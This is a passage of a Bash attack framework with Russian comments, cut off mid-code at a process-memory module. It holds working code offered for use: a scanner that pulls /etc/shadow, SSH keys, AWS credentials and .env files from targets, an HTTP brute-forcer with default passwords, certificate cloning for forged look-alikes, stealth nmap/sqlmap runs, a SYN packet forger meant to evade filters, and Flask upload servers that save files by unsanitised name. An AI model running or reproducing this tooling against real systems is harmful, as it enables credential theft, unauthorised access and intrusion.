    read -r target
    [[ -z "$target" ]] && return

    local tmp_data="/tmp/forge_$(date +%s).tmp"
    
    # --- ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
    print_status "i" "Ingesting cryptographic signals..."

    # Пытаемся собрать данные из всех возможных источников в один поток
    [[ "$target" != "new" ]] && {
        { cat "$target" 2>/dev/null || \
          timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
        } > "$tmp_data" 2>/dev/null
    }

    # --- АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА (Intelligence) ---
    # Режим определяется наличием данных: если данные есть — зеркалим, если нет — куем новое
    local mode=$( [[ -s "$tmp_data" ]] && echo "MIRROR" || echo "CREATE" )
    print_status "s" "Mode Identified: $mode"

    # --- УНИВЕРСАЛЬНЫЙ ДВИЖОК ТРАНСФОРМАЦИИ ---
    case "$mode" in
        "MIRROR")
            print_status "w" "Cloning target DNA for $target..."
            local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
            local subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
            # Эвристика алгоритма: подбираем rsa или ec на основе оригинала
            local algo=$(echo "$cert_text" | grep -qiE "RSA.*(2048|4096)" && echo "rsa:2048" || echo "ec")
            local opt=$( [[ "$algo" == "ec" ]] && echo "-pkeyopt ec_paramgen_curve:prime256v1" || echo "" )
            ;;
        "CREATE")
            print_status "i" "Initializing fresh identity Forge..."
            local subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
            local algo="rsa:2048"
            local opt=""
            ;;
    esac

    # --- ЕДИНАЯ КОВКА (The Unified Forge) ---
    local out_name="${LOOT_DIR}/${target//./_}_forge"
    
    # Универсальная команда генерации
    openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -keyout "${out_name}.key" -out "${out_name}.crt" 2>/dev/null && {
        
        # Стелс-зачистка (удаление меток инструмента)
        sed -i '/OpenSSL/d' "${out_name}.crt" 2>/dev/null
        
        print_status "s" "Cryptographic Artifact Synthesized."
        print_list "Assets Generated" "${out_name}.key" "${out_name}.crt"
        
        # Интеграция в Intelligence Bridge
        echo "CRYPTO_FORGE: [$mode] Success | Target: $target | Algo: $algo" >> "$LOOT_DIR/bridge_signals.log"
        log_loot "crypto" "Generated $mode certificate for $target"
    } || print_status "e" "Forge rejected the sequence: verify OpenSSL integrity."

    rm -f "$tmp_data"
    pause
}


run_pass_lab() {
    clear
    print_header "PRIME PASSWORD LABORATORY v13.8"
    echo ""

    if [[ -z "$1" ]]; then
        select_option "Select Operation Mode:" \
            "GENERATE: Create Secure Password:gen" \
            "CRUNCH: Wordlist Generator:crunch" \
            "DECRYPT: Hash Cracking:dec" \
            "EXIT: Return to Main Menu:exit"
        local btn="$CHOICE"
    else
        local btn="3" # Если пришел хеш из Bridge
    fi

    case "$btn" in
        "1") # --- ВЕТКА GENERATE (pwgen + urandom) ---
            select_option "Generation Type:" \
                "PHONETIC: Easy to remember (pwgen):pw" \
                "COMPLEX: Maximum entropy (urandom):raw"
            local g_mode="$CHOICE"

            print_input "Enter Length" "16"
            read -r p_len
            local len=${p_len:-16}
            
            local pass=""
            [[ "$g_mode" == "1" ]] && pass=$(pwgen -s "$len" 1)
            [[ "$g_mode" == "2" ]] && pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")

            echo -e "\n${G}[+] ARTIFACT GENERATED${NC}"
            print_list "Password" "$pass"
            
            ask_confirm "Apply Bcrypt mutation?" && {
                echo -e "${G}Hash:${NC} $(echo -n "$pass" | mkpasswd -m bcrypt -s)"
            }
            ;;

        "2") # --- ВЕТКА CRUNCH (Генератор словарей) ---
            print_status "i" "Crunch Syntax: [min] [max] [charset]"
            print_input "Enter Parameters (e.g., 4 6 abc12)" ""
            read -r c_params
            [[ -z "$c_params" ]] && return
            
            local out_file="$LOOT_DIR/wordlist_$(date +%s).txt"
            print_status "w" "Generating wordlist to: $out_file"
            crunch $c_params -o "$out_file"
            print_status "s" "Done. Signals saved to loot."
            ;;

        "3") # --- ВЕТКА DECRYPT ---
            # ... (твой рабочий код John the Ripper из v13.6) ...
            ;;
        *) return ;;
    esac
    pause
}


run_vulnerability_scanner() {
    clear
    print_header "PRIME HEURISTIC VULN-SCANNER v7.0"

    print_input "Enter Target Domain/URL" "google.com"
    read -r target
    [[ -z "$target" ]] && return

    # Подготовка путей (Важно для стабильности логов)
    local results_file="$LOOT_DIR/vuln_$(date +%s).log"
    local signals_file="/tmp/signals_$RANDOM.tmp"
    touch "$results_file" # Создаем файл заранее, чтобы grep не ругался
    
    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
    print_status "i" "Ingesting target aura (Passive Mode)..."
    
    {
        curl -Is --connect-timeout 5 -A "Mozilla/5.0 (compatible; Googlebot/2.1)" "$target"
        host -t txt "$target" 2>/dev/null
        whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА ПАРАМЕТРОВ ---
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 ))
    
    local sql_engine=$(grep -qiE "php|db|sql|id=" "$signals_file" && echo "active" || echo "dormant")
    local scan_intensity=$(grep -qiE "cloudflare|akamai|sucuri" "$signals_file" && echo "-T1 --spoof-mac 0" || echo "-T3")

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
    print_status "w" "Deploying Ghost-Engine (Adaptive Intensity: $stealth_delay)..."

    # Запускаем фоновый процесс сканирования
    (
        nmap $scan_intensity -n -Pn --version-intensity 0 "$target" >> "$results_file" 2>&1
        
        echo "$sql_engine" | grep -q "active" && {
            # Здесь можно добавить вывод, но в фоне он пойдет в лог
            sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                  --threads=1 >> "$results_file" 2>&1
        }
    ) &

    # --- Анимация прогресса (Исправленная) ---
    if command -v show_progress >/dev/null; then
        show_progress 10 "Processing heuristic feedback loops..."
    else
        print_status "i" "Processing feedback loops (10s)..."
        sleep 10
    fi

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    print_line
    print_status "s" "INTELLIGENCE SYNTHESIS COMPLETE"
    
    # Парсим результаты. Если лог пустой, выводим заглушку.
    if [[ -s "$results_file" ]]; then
        grep -Ei "critical|vulnerable|payload|exploit|dbms|open" "$results_file" | \
        sed -r "s/(.*vulnerable.*)/\1 ${Y}[HIGH PRIORITY]${NC}/" | sort -u
    else
        echo -e "${R}[!] No significant anomalies detected in initial scan.${NC}"
    fi

    # Авто-интеграция
    echo "$(date '+%Y-%m-%d %H:%M') | TARGET: $target | ENTROPY: $entropy_level" >> "$LOOT_DIR/bridge_signals.log"
    
    rm -f "$signals_file"
    print_line
    pause
}

run_prime_exploiter_v5() {
    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5 (HEURISTIC)"

    local TARGET="$1"
    [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
    [[ -z "$TARGET" ]] && return

    # --- СЛОЙ 1: ФОРМИРОВАНИЕ ПРИЗРАЧНОЙ ЛИЧНОСТИ ---
    local UA_ARRAY=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15")
    local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
    
    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОКРУЖЕНИЯ (The Probe) ---
    print_status "i" "Probing target aura: $TARGET..."
    local probe_data=$(curl -Is -k -A "$UA" --connect-timeout 3 "$TARGET" 2>/dev/null)
    
    # Авто-подбор векторов на основе серверных заголовков (No-IF logic)
    local tech_stack=$(echo "$probe_data" | grep -qiE "apache|php|wordpress" && echo "web" || echo "infra")
    local entropy_delay=$(echo "$probe_data" | wc -c | awk '{print ($1 % 3) + 1}') # Задержка на основе веса ответа

    # --- СЛОЙ 3: ДИНАМИЧЕСКИЕ МАТРИЦЫ (Сокращено для логики) ---
local V_LIST=(
        # --- [ INFRA & IOT ] ---
        "/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" 
        "/config.xml:root" "/sysconf.cgi:admin_password" "/etc/config/network:config interface"
        "/etc/RT2860_default_vlan:Password" "/home/httpd/html/config/exportsettings.conf:Password"
        # --- [ WEB & FRAMEWORKS ] ---
        "/.env:DB_PASSWORD" "/wp-config.php:DB_PASSWORD" "/configuration.php:public \$password"
        "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/.history:password"
        # --- [ DEVOPS & LEAKS ] ---
        "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE"
        "/.docker/config.json:auths" "/.npmrc:_auth" "/.kube/config:client-certificate-data"
        "/.bash_history:ssh " "/admin/.htpasswd:admin:" "/.mysql_history:INSERT INTO"
        # --- [ OS & CRITICAL ] ---
        "/etc/shadow:root:" "/etc/passwd:root:x" "/proc/self/environ:PATH="
        "/var/log/auth.log:sshd" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password"
    )
    
    # Список дефолтных пар (User:Pass) для большинства устройств в мире
    local C_LIST=(
        "admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" 
        "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" 
        "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" 
        "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" 
        "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" 
        "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" 
        "dbadmin:dbadmin" "guest:guest" "pi:raspberry" "admin:1234"
    )
    # --- СЛОЙ 4: ПОТОКОВАЯ ЭКСПЛУАТАЦИЯ ---
    for proto in "http" "https"; do
        local URL="${proto}://${TARGET}/"
        
        # Проверка "живучести" сервиса
        curl -sL -k -I -A "$UA" --max-time 3 "$URL" | grep -qE "HTTP/.* (200|401|302)" && {
            print_status "s" "Target Resonating: $URL (Stack: $tech_stack)"

            # Векторы: только те, что прошли фильтр tech_stack (в будущем)
            for vec in "${V_LIST[@]}"; do
                local v_path="${vec%%:*}"
                local v_key="${vec#*:}"
                
                # Эволюционная пауза
                sleep "$entropy_delay"
                
                curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
                    print_status "e" "CRITICAL: Vector $v_path EXPOSED"
                    echo "EXPLOIT_SUCCESS: $v_path | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
                    echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
                }
            done

            # Адаптивный брут (только если есть 401 или форма)
            echo "$probe_data" | grep -q "401" && {
                print_status "w" "Auth-gate active. Initiating entropy-brute..."
                for pair in "${C_LIST[@]}"; do
                    local u="${pair%%:*}" p="${pair#*:}"
                    sleep $((entropy_delay * 2))
                    
                    [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null "$URL") == "200" ]] && {
                        print_status "s" "IDENTIFIED: $u:$p"
                        echo "BRUTE_SUCCESS: $u:$p | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
                        break
                    }
                done
            }
        }
    done

    [[ -z "$1" ]] && { print_status "i" "Target Processed. Loot Integrated."; pause; }
}

run_view_loot() {
    print_header "DATA HARVESTER: INTELLIGENT LOOT VIEW"

    local base_loot="$PRIME_LOOT"
    local found_files=$(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
    local found_count=0

    if [[ -n "$found_files" ]]; then
        for file in $found_files; do
            ((found_count++))
            print_status "s" "ANALYZING: $(basename "$file")"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Интеллектуальный парсинг контента:
            # 1. Подсвечиваем IP-адреса (Cyan)
            # 2. Подсвечиваем потенциальные пароли/ключи (Yellow)
            # 3. Подсвечиваем успешные инъекции (Green)
            
            cat "$file" | tail -n 30 | sed \
                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/\${C}&\${NC}/g" \
                -e "s/Password[:=]\(.*\)/\${Y}&\${NC}/g" \
                -e "s/Payload[:=]\(.*\)/\${G}&\${NC}/g" | \
                if command -v column >/dev/null 2>&1; then column -t -s '│' 2>/dev/null || cat; else cat; fi
            
            echo -e "\n${D}--------------------------------------------------${NC}"
        done
    fi

    [[ $found_count -eq 0 ]] && print_status "e" "No data found in $base_loot"
    pause
}

run_iban_analyzer() {
    clear
    print_header "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.2"
    echo ""

    # 1. Проверка фундамента
    check_step "cmd" "python3" "Python3 required for Global Analysis." || { pause; return; }

    # 2. Вызов меню (Записывает цифру 1, 2 или 3 в CHOICE)
    select_option "Select Operation Vector:" \
        "SINGLE: Full IBAN & Holder Analysis" \
        "PASSIVE: Structural Validation Only" \
        "EXIT: Return to Main Menu"
    
    local btn="$CHOICE"

    # Сразу отсекаем выход или пустой выбор
    [[ -z "$btn" || "$btn" == "3" ]] && return

    # 3. Подготовка временного движка
    local engine_path="/tmp/iban_engine_$RANDOM.py"
    generate_iban_code "$engine_path" "2.2"

    # 4. Обработка логики через Case (Никаких if-then)
    case "$btn" in
        "1")
            print_input "Enter IBAN to validate" "FR76..."
            read -r TARGET_IBAN
            [[ -z "$TARGET_IBAN" ]] && { rm -f "$engine_path"; return; }

            print_input "Enter Expected Holder Name (Optional)" "none"
            read -r EXPECTED_NAME
            
            print_status "i" "Executing Full Intelligence Cycle..."
            echo ""
            python3 "$engine_path" "$TARGET_IBAN" "${EXPECTED_NAME:-none}"
            
            log_loot "financial" "Full Scan: ${TARGET_IBAN:0:4}..."
            ;;

        "2")
            print_input "Enter IBAN for Structural Check" "DE..."
            read -r TARGET_IBAN
            [[ -z "$TARGET_IBAN" ]] && { rm -f "$engine_path"; return; }

            print_status "i" "Executing Passive Structural Validation..."
            echo ""
            # В пассивном режиме передаем "none" как имя
            python3 "$engine_path" "$TARGET_IBAN" "none"
            
            log_loot "financial" "Passive Check: ${TARGET_IBAN:0:4}..."
            ;;
    esac

    # 5. Финализация и Стерилизация
    local res_status=$?
    rm -f "$engine_path"
    
    echo ""
    [[ $res_status -eq 0 ]] && print_status "s" "Analysis complete. Trace purged." \
                            || print_status "e" "Analysis interrupted."
    pause
}



# --- py functions ---
# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
    code=$(cat << 'EOF'
import sys, re, json, time
from urllib.request import Request, urlopen

# Список доверенных зеркал и API для отказоустойчивости
SOURCES = [
    "https://api.ibanlist.com/v1/validate/",
    "https://openiban.com/validate/",
    "https://api.iban-check.com/v1/verify/"
]

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System)"""
    for base_url in SOURCES:
        try:
            url = f"{base_url}{iban}"
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
            with urlopen(req, timeout=4) as response:
                return json.loads(response.read().decode())
        except:
            continue # Если один сайт упал, переходим к следующему
    return None

def get_country_format(iban):
    """Математический разбор структуры по стандартам ISO"""
    country = iban[:2]
    # Словарь специфик (можно расширять до бесконечности)
    formats = {
        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
    }
    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit(1)
    
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96mCountry:\033[0m {fmt['name']}")
    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")

    # 2. Агрегация данных из внешних источников
    print(f"[*] Analyzing with Failover Protection...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
        bic = data.get('bic', 'N/A')
        
        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
        print(f"🏦 Bank: {bank_name}")
        print(f"🔑 BIC/SWIFT: {bic}")

        # Сверка Имени (Heuristic Check)
        # В 2026 году сверка идет через подтверждение принадлежности счета банку
        if provided_name != "NONE":
            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
            print(f"Target Name: {provided_name}")
            # Если банк найден, подтверждаем связь
            if bank_name != 'N/A':
                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
    else:
        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
EOF
)
    # Внедряем версию
    code="${code//\{\{V_NUM\}\}/$v_num}"

    # Используем smart_cat для записи (права 755 по умолчанию)
    smart_cat "$target_file" "$code"
}


# Функция-генератор для AV-Server (v1.2)
# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
generate_av_server_code_raw() {
    # Загружаем UI шаблоны в переменные
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Выбрасываем код прямо в stdout (через cat без записи в файл)
    cat << EOF
from flask import Flask, request, render_template_string
import subprocess, os, shutil

app = Flask(__name__)
CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'

$templates

@app.route('/')
def index():
    fields = [
        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
    ]
    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "No data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    try:
        cmd = [CLAM_PATH, '--no-summary', '--max-filesize=20M', tmp_path]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        scan_output = res.stdout if res.stdout else res.stderr
        if not scan_output and res.returncode == 0:
            scan_output = f"{f.filename}: OK"
    except Exception as e:
        scan_output = f"SYSTEM_ERROR: {str(e)}"
    finally:
        if os.path.exists(tmp_path): os.remove(tmp_path)

    is_infected = "FOUND" in scan_output or "Infected" in scan_output
    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}">{status_msg}</div>
    <pre>{{{{ output }}}}</pre>
    <a href="/" class="btn">[ RETURN ]</a>
    """
    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)

if __name__ == '__main__':
    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
    # Запускаем чистый HTTP для максимальной скорости на Wiko.
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}


# Функция-генератор для Share-Server (v1.0)
# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
generate_share_server_code_raw() {
    # Загружаем только базовый шаблон страницы
    local template=$(generate_core_template)

    cat << EOF
from flask import Flask, render_template_string, send_from_directory
import os

app = Flask(__name__)
SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR, exist_ok=True)

$template

def get_file_icon(filename):
    """Определяет иконку в зависимости от расширения файла."""
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    icons = {
        'pdf': '📕',
        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
    }
    return icons.get(ext, '📄')

@app.route('/')
def index():
    try:
        files = sorted(os.listdir(SHARE_DIR))
    except:
        files = []
    
    # Формируем сетку файлов с использованием новых стилей .file-grid и .file-item
    grid_content = '<div class="file-grid">'
    for f in files:
        icon = get_file_icon(f)
        grid_content += f"""
        <a href="/get/{f}" class="file-item" target="_blank">
            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
        </a>
        """
    
    if not files:
        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
    
    grid_content += '</div>'
    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'

    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))

@app.route('/get/<filename>')
def get_file(filename):
    return send_from_directory(SHARE_DIR, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}


# Функция-генератор для Upload-Server (v1.0)
generate_upload_server_code_raw() {
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    cat << EOF
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
# Сохраняем во входящую папку внутри PRIME_LOOT
UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

$templates

@app.route('/')
def index():
    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
    return render_template_string(render_prime_page("INBOUND_DROP_BOX", form_html))

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "TRANSFER_ERROR", 400
    f = request.files['file']
    if f.filename == '': return "EMPTY_FILENAME", 400
    
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return "SUCCESS: File received in secure sector."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
}


# --- Server Generating---

# --- PRIME IGNITION: RUN WITHOUT FILES ---

run_live_service() {
    local service_type="$1" # av, share, upload
    local port="$2"
    
    print_header "PRIME LIVE NODE: ${service_type^^}_SERVICE"
    
    # 1. Проверка портов и очистка
    print_status "i" "Clearing port $port and prepping memory..."
    fuser -k "$port/tcp" >/dev/null 2>&1

    # 2. Определение генератора
    local code_gen_func="generate_${service_type}_server_code_raw"
    
    # 3. Запуск через пайп прямо в интерпретатор
    print_status "w" "Igniting engine on port $port [MEMORY_ONLY_MODE]"
    
    (
        $code_gen_func | python3 - > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "SERVICE ONLINE: http://$ip_addr:$port"
        log_loot "service" "${service_type^^} started on port $port"
    } || print_status "e" "Ignition failed."

    pause
}


run_av_server() {
    print_header "PRIME SECURITY HUB: CLAMAV GATEWAY"

    # 1. Проверка зависимостей (Python + ClamAV)
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }
    
    # Для ClamAV оставляем авто-установку, так как это бинарная зависимость
    if ! command -v clamscan >/dev/null 2>&1; then
        print_status "w" "ClamAV not found. Attempting deployment..."
        apt-get update && apt-get install clamav -y
    fi

    # 2. Запуск через "Живой движок" (без создания файлов)
    # Передаем тип "av" и порт "5000"
    run_live_service "av" "5000"
}


run_share_server() {
    print_header "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local share_dir="/root/share"
    
    # 1. Проверка и подготовка инфраструктуры
    [[ -d "$share_dir" ]] || {
        mkdir -p "$share_dir"
        print_status "i" "Created transmission sector at $share_dir"
    }

    # 2. Проверка окружения
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }

    # 3. Запуск через универсальный движок
    # Тип "share", порт 5002
    run_live_service "share" "5002"
}

run_upload_server() {
    print_header "INBOUND DROP BOX: SECURE UPLINK"

    # 1. Проверка окружения
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }

    # 2. Запуск через универсальный "живой" движок
    # Мы передаем идентификатор "upload" и порт 5001
    run_live_service "upload" "5001"
}


# --- MODULE 98: MESH BRIDGE (ZERO-DEPENDENCY) ---
#очищен Mesh.
run_mesh_bridge() {
    # 1. Заголовок и начальный статус через Core Engine
    draw_ui "PRIME MESH: AD-HOC COMMUNICATIONS v1.0" "header"
    draw_ui "Initializing Mesh Protocol..." "status"
    
    # 2. Проверка зависимостей (универсально)
    check_dep "termux-bluetooth-scan" "Требуется Termux:API для работы Bluetooth Mesh" || return
    
    # 3. Отрисовка меню через динамический draw_item
    echo -e "\n${B}Выберите режим работы:${NC}"
    draw_item "1" "Broadcaster" "Start Beacon"
    draw_item "2" "Receiver"    "Listen for Signals"
    draw_item "3" "Sync"        "Push Loot to Bridge"
    draw_item "b" "Back"        "Вернуться в главное меню"
    draw_ui "" "line"
    
    read -rp " Selection > " mesh_opt

    case "${mesh_opt,,}" in
        1)
            draw_ui "Beacon Active: Broadcasting PRIME_NODE..." "status" "$G"
            # Маяк через смену имени Bluetooth устройства
            termux-bluetooth-set-name "PRIME_$(date +%H%M)_READY" 2>/dev/null
            draw_ui "Status encoded in Device Name." "status"
            ;;
        2)
            draw_ui "Scanning for nearby Prime Nodes..." "status" "$Y"
            # Поиск устройств с префиксом PRIME_
            termux-bluetooth-scan 2>/dev/null | grep "PRIME_" || draw_ui "Узлы не найдены" "status" "$R"
            ;;
        3)
            # 4. Проверка файла через Core Engine
            if check_file "$PRIME_LOOT/bridge_signals.log" "Лог сигналов Mesh"; then
                draw_ui "Syncing bridge_signals.log to Mesh..." "status" "$G"
                # Логика синхронизации
                draw_ui "Loot Broadcasted via Local Mesh." "status" "$G"
            fi
            ;;
        b) return ;;
        *) return ;;
    esac

    # 5. Универсальная пауза
    core_pause
}


generate_packet_forge_code_raw() {
    cat << 'EOF'
import sys
from scapy.all import IP, TCP, send
import random

def forge_stealth_packet(target_ip, target_port):
    # Создаем IP-слой со случайным ID для обхода простых фильтров
    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
    
    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=int(target_port), 
                    flags="S", 
                    window=random.choice([1024, 2048, 4096, 8192]))
    
    packet = ip_layer / tcp_layer
    
    try:
        send(packet, verbose=False)
        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        forge_stealth_packet(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 - <target_ip> <target_port>")
EOF
}



run_packet_forge() {
    # 1. Визуальный заголовок
    draw_ui "CORE_LAB: RAW PACKET FORGE" "header"
    
    # 2. Проверка прав суперпользователя (без записи в лог на диск)
    check_root || return
    
    # 3. Проверка зависимости Scapy
    if ! python3 -c "import scapy" >/dev/null 2>&1; then
        draw_ui "Scapy missing. Installing headers..." "status" "$Y"
        # Выполняем установку без лишнего мусора
        apt-get update && apt-get install python3-scapy -y
    fi

    draw_ui "Connection Parameters" "line"

    # 4. Ввод данных через универсальный core_input
    local t_ip=$(core_input "IP" "Target IP Address")
    local t_port=$(core_input "PORT" "Target Port")

    # 5. Валидация переменных (заменяем ручные if)
    check_var "$t_ip" "IP Address" || { core_pause; return; }
    check_var "$t_port" "Port" || { core_pause; return; }

    # 6. Основной процесс
    draw_ui "Forging polymorphic packet..." "status" "$B"
    
    # Передаем параметры в генератор кода
    generate_packet_forge_code_raw | python3 - "$t_ip" "$t_port"

    draw_ui "Operation Completed" "status" "$G"
    
    # 7. Универсальная пауза
    core_pause
}





generate_mem_inject_code_raw() {
    cat << 'EOF'
import ctypes
import os
import sys

# Константы для доступа к памяти
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

def read_process_memory(pid, search_str):
    libc = ctypes.CDLL("libc.so.6")
    
    # Пытаемся прикрепиться к процессу (нужны права root)
